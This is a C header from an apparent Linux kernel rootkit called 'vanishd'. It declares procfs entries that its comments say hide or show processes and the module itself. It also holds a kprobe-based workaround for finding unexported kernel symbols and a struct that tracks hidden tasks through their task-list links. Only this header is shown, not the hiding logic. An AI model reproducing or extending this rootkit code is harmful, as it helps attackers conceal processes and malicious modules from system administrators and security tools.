#pragma once 

#include <linux/pid.h>
#include <linux/hashtable.h>
#include <linux/sched.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/ptrace.h>
#include <linux/container_of.h>

#define PROC_PROCESS "process" // procfs entry used to hide or show process
#define PROC_MODULE "module" // procfs entry used to hide or show the module itself 
#define BUF_SIZE 128

/*
*
 * lookup name using ftrace from ftrace_helper.h
 *
 * Copyright (c) 2018 ilammy
 */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = {
		.symbol_name = name
	};
	unsigned long retval;

	if (register_kprobe(&kp) < 0) return 0;
	retval = (unsigned long) kp.addr;
	unregister_kprobe(&kp);
	return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif

struct vanishd_hidden {
    pid_t pid; 
    struct pid *pinned_pid;  
    struct list_head *prev_task; 
    struct task_struct *task;
    struct hlist_node node; 
};





